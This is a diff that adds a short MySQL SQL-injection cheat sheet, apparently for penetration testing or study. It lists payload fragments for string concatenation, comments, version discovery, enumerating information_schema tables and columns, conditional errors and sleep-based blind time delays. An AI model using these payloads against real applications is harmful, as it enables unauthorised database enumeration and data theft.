@@ -1,0 +1,26 @@
+String concatenation
+'foo' 'bar'
+CONCAT('foo','bar')
+
+Substring
+SUBSTRING('foobar', 4, 2)
+
+Comments
+#comment
+/*comment*/
+
+Database version
+SELECT @@version
+
+Database contents
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE_NAME_HERE'
+
+Conditional errors
+SELECT IF(YOUR_CONDITION_HERE,(SELECT table_name FROM information_schema.tables),'a')
+
+Time Delays
+SELECT sleep(10)
+
+Conditional time delays
+SELECT IF(YOUR_CONDITION_HERE,sleep(10),'a')
